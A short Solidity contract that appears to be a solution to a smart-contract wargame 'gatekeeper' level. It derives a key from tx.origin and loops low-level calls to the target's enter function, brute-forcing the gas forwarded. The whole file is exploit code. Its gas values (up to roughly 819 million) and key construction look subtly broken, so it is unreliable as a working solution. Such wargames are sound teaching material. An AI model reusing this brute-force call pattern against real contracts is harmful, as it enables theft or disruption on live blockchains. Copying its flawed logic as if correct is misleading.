pragma solidity ^0.4.18;

contract GateforcerOne {
    function enter(address gatekeeper) public returns(bool) {
        bytes8 _gateKey = bytes8(uint16(tx.origin)) | byte(0x10);
        bytes4 functionSig = bytes4(keccak256("enter(bytes8)"));

        for(uint256 i = 0; i < 8191; i++) {
            if(gatekeeper.call.gas(i*100000)(functionSig, _gateKey)) {
                return true;
            }
        }

        return false;
    }
}
